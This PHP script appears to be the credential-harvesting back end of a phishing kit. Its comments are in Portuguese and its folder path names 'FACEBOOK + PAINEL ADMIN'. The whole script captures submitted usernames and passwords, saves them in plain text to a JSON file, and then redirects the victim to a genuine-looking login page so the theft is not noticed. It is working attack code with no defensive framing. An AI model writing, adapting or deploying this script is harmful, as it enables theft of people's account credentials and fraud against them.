


<?php
// Recebe os dados via POST
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (isset($_POST['username']) && isset($_POST['password'])) {
        $username = $_POST['username'];
        $password = $_POST['password'];

        // Caminho do arquivo JSON
        $fl = "/home/souza/Downloads/FACEBOOK + PAINEL ADMIN/operador/seguro/boleto1.json";

        // Verifica se o arquivo JSON já existe
        if (file_exists($fl)) {
            // Abre o arquivo JSON para leitura
            $h = fopen($fl, "r");
            $arr = json_decode(fread($h, filesize($fl)), true);
            fclose($h);
        } else {
            // Se o arquivo não existir, cria um array vazio
            $arr = [];
        }

        // Adiciona os dados no array
        array_push($arr, ["username" => $username, "password" => $password]);

        // Abre o arquivo JSON para escrita
        $fhs = fopen($fl, 'w');
        if ($fhs === false) {
            die("Erro ao tentar abrir o arquivo para gravação.");
        }

        // Grava os dados no arquivo JSON
        fwrite($fhs, json_encode($arr, JSON_PRETTY_PRINT));
        fclose($fhs);

        // Redireciona para a página desejada
        header("Location: https://obauth.omnibees.com/core/login?signin=cf4e8f1aca93c0258057c413c939d7ba");
        exit;
    } else {
        echo "Erro: Dados não recebidos corretamente.";
    }
}
?>

    